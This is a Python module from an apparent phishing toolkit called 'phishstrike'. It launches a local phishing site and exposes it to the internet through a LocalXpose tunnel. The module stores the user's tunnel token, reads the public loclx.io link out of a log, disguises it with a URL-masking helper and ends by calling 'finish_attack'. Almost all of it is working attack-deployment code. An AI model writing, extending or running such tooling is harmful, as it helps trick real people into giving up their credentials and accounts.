import os
import platform
import re
import subprocess
import time

from phishstrike import state
from phishstrike.features.mask import custom_url
from phishstrike.server.php import cusport, setup_site
from phishstrike.tunnel.helpers import finish_attack
from phishstrike.lib.terminal_ui import *


def localxpose_auth() -> None:
    loclx_bin = os.path.join(
        state.BASE_DIR,
        ".server",
        "loclx.exe" if platform.system() == "Windows" else "loclx",
    )
    subprocess.Popen(
        [loclx_bin, "-help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(1)

    auth_f = os.path.join(os.path.expanduser("~"), ".localxpose", ".access")
    os.makedirs(os.path.dirname(auth_f), exist_ok=True)

    status = subprocess.run(
        [loclx_bin, "account", "status"], capture_output=True, text=True
    )
    if "Error" in status.stdout or "Error" in status.stderr:
        print(
            f"\n\n{DARK}[{WHITE}!{DARK}]{PURPLE} Create an account on "
            f"{LIGHT2}localxpose.io{PURPLE} & copy the token\n"
        )
        loading_animation(3, "Waiting for token")
        loclx_token = input(
            f"{DARK}[{WHITE}-{DARK}]{LIGHT2} Input Loclx Token :{LIGHT2} "
        )
        if not loclx_token:
            print(f"\n{DARK}[{WHITE}!{DARK}]{DARK} You have to input Localxpose Token.")
            time.sleep(2)
            from phishstrike.tunnel.menu import tunnel_menu

            tunnel_menu()
        else:
            with open(auth_f, "w") as f:
                f.write(loclx_token)


def start_loclx() -> None:
    cusport()
    print(
        f"\n{DARK}[{WHITE}-{DARK}]{PURPLE} Initializing... {PURPLE}( "
        f"{LIGHT2}http://{state.HOST}:{state.PORT} {PURPLE})"
    )
    loading_animation(2, "Initializing Server")
    setup_site()
    localxpose_auth()

    print("\n")
    opinion = input(
        f"{DARK}[{WHITE}?{DARK}]{LIGHT2} Change Loclx Server Region? "
        f"{PURPLE}[{LIGHT2}y{PURPLE}/{LIGHT2}N{PURPLE}]:{LIGHT2} "
    )
    loclx_region = "eu" if opinion.lower() == "y" else "us"
    slow_type(
        "    [+] Launching LocalXpose Secure Tunnel...",
        speed=0.01,
        start_rgb=RGB_WHITE,
        end_rgb=RGB_BLUE,
    )

    loclx_bin = os.path.join(
        state.BASE_DIR,
        ".server",
        "loclx.exe" if platform.system() == "Windows" else "loclx",
    )

    if platform.system() != "Windows" and os.path.exists(loclx_bin):
        os.chmod(loclx_bin, 0o755)

    loclx_log = os.path.join(state.BASE_DIR, ".server/.loclx")
    with open(loclx_log, "w") as log:
        subprocess.Popen(
            [
                loclx_bin,
                "tunnel",
                "--raw-mode",
                "http",
                "--region",
                loclx_region,
                "--https-redirect",
                "-t",
                f"{state.HOST}:{state.PORT}",
            ],
            stdout=log,
            stderr=log,
        )

    loading_animation(12, "Generating Tunnel Link")
    loclx_url = ""
    if os.path.exists(loclx_log):
        with open(loclx_log, "r") as f:
            content = f.read()
            match = re.search(r"[0-9a-zA-Z.]*\.loclx\.io", content)
            if match:
                loclx_url = match.group(0)

    custom_url(loclx_url)
    finish_attack()
